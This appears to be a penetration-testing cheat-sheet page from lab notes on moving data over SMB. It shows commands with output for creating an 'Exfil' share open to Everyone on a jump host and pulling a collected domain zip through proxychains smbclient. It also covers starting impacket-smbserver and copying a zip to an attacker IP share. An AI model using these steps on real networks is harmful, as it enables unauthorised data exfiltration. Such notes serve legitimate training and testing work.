# SMB

## PowerShell Create SMB Share - Jump Host

```powershell
PS C:\Users\Public> New-SmbShare -Name "Exfil" -Path C:\Users\Public\Documents -FullAccess "Everyone"

Name  ScopeName Path                      Description
----  --------- ----                      -----------
Exfil *         C:\Users\Public\Documents            


PS C:\Users\Public> Get-SmbShare

Name   ScopeName Path                      Description  
----   --------- ----                      -----------  
ADMIN$ *         C:\Windows                Remote Admin 
C$     *         C:\                       Default share
Exfil  *         C:\Users\Public\Documents              
IPC$   *                                   Remote IPC   


```

### Getting Data&#x20;

NOTE: Make sure to include the Domain name in the username: "DOMAIN/Username"

```shell-session
└─$ proxychains smbclient //172.16.224.11/Exfil -U "MEDTECH/joe"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Password for [MEDTECH\joe]:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.224.11:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Dec 13 23:49:18 2023
  ..                                DHS        0  Wed Dec 13 23:49:17 2023
  20231213201811_MEDTECH.zip          A    23757  Wed Dec 13 23:18:58 2023
  ZGViMzVhYzItYmNiMy00MmY2LWEzYjItZmE0NGEyNDBlMWMz.bin      A    44405  Wed Dec 13 23:18:58 2023

                7699967 blocks of size 4096. 4769448 blocks available

```

## Impacket-smbserver

We can start a smb server with impacket-smbserver and transfer files to and from our kali host

```
python smbserver.py SHARE_NAME PATH_TO_SHARE -smb2support
```



## Transfer Data

```powerquery
PS> copy 20240207102333_SUPPORT.zip \\10.10.16.3\test
```
